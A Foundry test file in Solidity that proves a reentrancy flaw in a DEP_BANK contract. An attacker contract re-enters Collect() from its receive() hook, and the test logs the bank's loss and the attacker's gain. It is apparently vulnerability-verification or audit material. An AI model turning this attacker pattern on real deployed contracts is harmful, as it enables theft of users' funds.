// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract ReentrancyAttacker {
    DEP_BANK private bank;
    uint public amount;
    bool public reentered;

    constructor(DEP_BANK _bank) {
        bank = _bank;
        reentered = false;
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }

    function initiateAttack(uint _amount) public {
        amount = _amount;
        bank.Collect(_amount);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            bank.Collect(amount);
        }
    }
}

contract DEP_BANKTest is Test {
    DEP_BANK public bank;
    LogFile public logFile;
    ReentrancyAttacker public attacker;

    function setUp() public {
        // Deploy contracts
        logFile = new LogFile();
        bank = new DEP_BANK();
        
        // Initialize bank configuration
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(0); // Set minimum withdrawal sum to zero

        // Deploy attacker contract
        attacker = new ReentrancyAttacker(bank);
    }

    function testReentrancyInCollect() public {
        // Fund attacker contract with 1 ether
        vm.deal(address(attacker), 1 ether);
        
        // Attacker deposits to the bank
        attacker.deposit{value: 1 ether}();
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Bank Balance Before (ETH):", bankBalanceBefore);
        console.log("Attacker Balance Before (ETH):", attackerBalanceBefore);
        assertEq(bankBalanceBefore, 1 ether, "Initial bank balance incorrect");
        
        console.log("--- Trigger Reentrancy Attack ---");
        attacker.initiateAttack(1 ether);
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Bank Balance After (ETH):", bankBalanceAfter);
        console.log("Attacker Balance After (ETH):", attackerBalanceAfter);
        
        uint256 bankLoss = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Bank Loss (ETH):", bankLoss);
        console.log("Attacker Gain (ETH):", attackerGain);
        
        bool fundsStolen = (bankLoss > 0 && attackerGain > 0);
        bool reentrancyTriggered = attacker.reentered();
        
        // Print attack success analysis
        console.log("=== Attack Outcome ===");
        console.log("Reentrancy Occurred:", reentrancyTriggered ? "YES" : "NO");
        console.log("Funds Stolen:", fundsStolen ? "YES" : "NO");
        
        // Final vulnerability verification
        if (reentrancyTriggered && fundsStolen) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded in stealing funds");
        } else if (reentrancyTriggered) {
            console.log("Vulnerability Exists: Reentrancy triggered but funds not stolen");
        } else {
            console.log("Vulnerability not Exist: Reentrancy did not occur");
        }
    }
}